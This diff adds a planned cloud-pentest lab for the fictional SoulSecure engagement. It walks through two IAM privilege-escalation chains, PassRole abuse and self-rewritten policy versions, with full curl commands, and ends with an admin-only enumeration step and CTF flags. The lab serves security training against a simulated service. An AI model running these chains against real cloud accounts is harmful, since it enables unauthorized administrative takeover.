@@ -1,0 +1,150 @@
+# Module 4 — Lab 3: Privilege Escalation via IAM Actions
+
+> **⚠️ PLANNED CONTENT — not yet built or deployed.** Describes the intended lab for
+> review before implementation. Nothing below is live yet.
+
+**Course:** Cloud Pentest — Module 4: IAM Exploitation & Privilege Escalation
+**Target:** SoulSecure Inc. (simulated engagement, continued)
+**Target host:** `https://iam.soulsecure.lab/`
+**Estimated time:** 90–120 minutes
+
+---
+
+## 1. Recap & scenario
+
+You've spent two labs mapping and reading. This one is about exploiting. You've
+flagged two structurally dangerous permission combinations — `soulsecure-deploy-role`'s
+`iam:PassRole` next to a task-running service, and `soulsecure-ci-deploy`'s ability to
+rewrite its own policy. Both are real, independent, well-known IAM privilege
+escalation techniques. Time to prove both actually work, and reach the account's
+top-level administrative role.
+
+> **Scope reminder:** `iam.soulsecure.lab`. Active exploitation authorized. Whatever
+> you escalate to, keep it — you'll need it going into Module 5.
+
+## 2. Learning objectives
+
+- Execute an `iam:PassRole` + task-execution privilege escalation chain end to end
+- Execute a self-managed-policy privilege escalation chain end to end, including the
+  easy-to-miss step of actually *activating* a new policy version
+- Understand why AWS requires an explicit "set as default" step for policy versions,
+  and why skipping it is a common real-world mistake (in both directions — attackers
+  who forget it, and defenders who think creating a version alone is safe)
+- Prove privilege escalation with concrete evidence: a call that used to fail now
+  succeeds
+
+## 3. Tasks
+
+### 3.1 — Chain one: PassRole abuse
+
+`soulsecure-deploy-role` can pass any role matching `automation-*` to the task
+service, and can create tasks. Combine them:
+
+```bash
+curl -sk -X POST https://iam.soulsecure.lab/automation/create-task \
+  -H "X-Access-Key-Id: ASIASOULSECUREDEPLOY02" -H "X-Secret-Access-Key: <secret>" \
+  -H 'Content-Type: application/json' \
+  -d '{"execution_role": "arn:aws:iam::445566778899:role/automation-admin-role", "command": "whoami"}'
+```
+
+If the response includes a set of temporary credentials, you just escalated from a
+mid-tier deployment identity to the account's top administrative role — the task
+service ran with whatever role you told it to, and you were allowed to tell it
+anything matching your `PassRole` scope.
+
+### 3.2 — Chain two: self-managed policy abuse
+
+`soulsecure-ci-deploy` can create new versions of its own attached policy. Creating a
+version alone doesn't activate it — real AWS behavior, and a genuine gotcha. You need
+two calls.
+
+```bash
+# Step 1: create a new version granting full access
+curl -sk -X POST https://iam.soulsecure.lab/iam/create-policy-version \
+  -H "X-Access-Key-Id: ASIASOULSECURECIDEPLOY03" -H "X-Secret-Access-Key: <secret>" \
+  -H 'Content-Type: application/json' \
+  -d '{"policy_name": "CIDeployPolicy", "document": {"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}}'
+
+# Step 2: activate it -- without this, the old version is still what's enforced
+curl -sk -X POST https://iam.soulsecure.lab/iam/set-default-policy-version \
+  -H "X-Access-Key-Id: ASIASOULSECURECIDEPLOY03" -H "X-Secret-Access-Key: <secret>" \
+  -H 'Content-Type: application/json' \
+  -d '{"policy_name": "CIDeployPolicy", "version": "v2"}'
+```
+
+Confirm it actually worked — try something `soulsecure-ci-deploy` couldn't do before.
+
+### 3.3 — Prove it
+
+Whichever chain you used (or both), use your newly elevated access to confirm your
+identity really is now the account's top role:
+
+```bash
+curl -sk https://iam.soulsecure.lab/sts/get-caller-identity \
+  -H "X-Access-Key-Id: <escalated-access-key>" -H "X-Secret-Access-Key: <escalated-secret>"
+```
+
+### 3.4 — Harder mode: is there anything else here?
+
+Now that you're effectively an administrator, check whether there's an admin-only
+view of the account you couldn't see before — something that would let you confirm
+you're not missing any identities that never turned up in Module 3 at all.
+
+```bash
+curl -sk https://iam.soulsecure.lab/iam/list-all-identities \
+  -H "X-Access-Key-Id: <escalated-access-key>" -H "X-Secret-Access-Key: <escalated-secret>"
+```
+
+## 4. Tools you'll want
+
+- `curl` — this lab is entirely API calls, in the right order, with the right bodies
+
+## 5. Deliverable: Privilege Escalation Chains
+
+| Starting identity | Technique | Steps taken | Ending privilege |
+|---|---|---|---|
+| `soulsecure-deploy-role` | | | |
+| `soulsecure-ci-deploy` | | | |
+
+**Flags found:**
+
+- [ ] Flag 1 (PassRole chain — admin credentials obtained): `flag{________________________________}`
+- [ ] Flag 2 (self-managed-policy chain — activation step completed): `flag{________________________________}`
+- [ ] Flag 3 (confirmed admin identity via `get-caller-identity`): `flag{________________________________}`
+- [ ] Flag 4 (harder mode — `list-all-identities`): `flag{________________________________}`
+
+## 6. Hints
+
+<details>
+<summary>Hint 1 — the execution role ARN</summary>
+
+You confirmed this role's name in Lab 2 when you read its full policy document.
+`arn:aws:iam::445566778899:role/automation-admin-role`.
+</details>
+
+<details>
+<summary>Hint 2 — why "create version" alone isn't enough</summary>
+
+If you skip the `set-default-policy-version` call, subsequent requests with
+`soulsecure-ci-deploy`'s credentials are still evaluated against the **old** default
+version — you'll see calls that should now succeed still failing, which is your
+signal something's missing, not that the technique doesn't work.
+</details>
+
+<details>
+<summary>Hint 3 — the admin-only endpoint</summary>
+
+`/iam/list-all-identities` returns `403` for every identity except one you're now
+holding credentials for.
+</details>
+
+## 7. Known limitations
+
+Same simplified `iam-sim` service as Labs 1–2. `automation:CreateTask`'s "task
+execution" is a canned response, not a real job scheduler.
+
+## 8. Next up
+
+Lab 4 (Cross-Account / Role Assumption Abuse) shows a third, different escalation
+pattern — one that doesn't touch policies at all, exploiting a trust relationship
+instead — plus a GCP-flavored equivalent for harder mode.
